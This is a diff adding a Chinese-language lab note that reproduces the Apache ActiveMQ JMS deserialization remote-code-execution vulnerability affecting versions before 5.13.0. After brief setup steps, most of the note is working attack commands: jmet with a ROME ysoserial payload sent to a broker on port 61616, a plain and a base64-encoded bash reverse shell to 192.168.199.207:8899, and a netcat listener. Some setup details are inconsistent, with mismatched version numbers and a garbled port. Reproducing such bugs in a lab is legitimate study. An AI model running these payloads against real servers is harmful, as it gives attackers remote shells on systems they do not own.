@@ -1,0 +1,60 @@
+参考网址： https://www.dazhuanlan.com/2019/10/16/5da620698633b/
+          https://mp.weixin.qq.com/s/TLmIjcqrBJ9kDCkgZAi_fQ
+          https://www.cnblogs.com/sallyzhang/p/12289983.html 
+
+漏洞原理
+
+该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。
+
+ 
+
+影响版本 
+
+5.13.0之前5.x版本
+
+
+环境： yum -y install docker(装docker)
+      curl -L https://github.com/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose(docker-compose命令找不到时用)
+      chmod +x /usr/local/bin/docker-compose
+      
+      执行docker-compose up -d
+      但会提示如下错误，
+      ERROR:
+        Can't find a suitable configuration file in this directory or any
+        parent. Are you in the right directory?
+
+        Supported filenames: docker-compose.yml, docker-compose.yaml
+      解决办法：
+      git clone https://github.com/apache/kudu.git
+      cd kudu/docker  
+      再次执行 docker-compose up -d 
+      
+      安装apache-activemq-5.11.1 
+      官网下载： https://cwiki.apache.org/confluence/display/ACTIVEMQ/ActiveMQ+5.11.1+Release
+      tar -zxvf apache-activemq-5.11.0-bin.tar.gz
+      启动命令：./activemq start （默认端口61616）
+      
+      控制台页面：http://localhost:8161/admin/
+      
+   复现：
+          jmet进行漏洞利用首先下载jmet的jar文件,并在同目录下创建一个external文件夹(否则可能会爆文件夹不存在
+        的错误)。jmet原理是使用ysoserial生成Payload并发送(其jar内自带ysoserial,无需再自己下载)。
+               wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
+mkdir external
+       2.执行命令
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/zqd” -Yp ROME 192.168.199.120 61616
+
+3现在我们可以通过http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：
+6反弹shell:
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i >& /dev/tcp/192.168.199.207/8899 0>&1” -Yp ROME 192.168.199.120 61616
+这里bash -i >& /dev/tcp/192.168.199.207/12340>&1”需要解码
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4yMDcvODg5OSAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.120 61616
+
+7 远程主机监听8899端口：
+nc -lvvp 8899
+nc -l -p 8899
+
+
+
+
+      
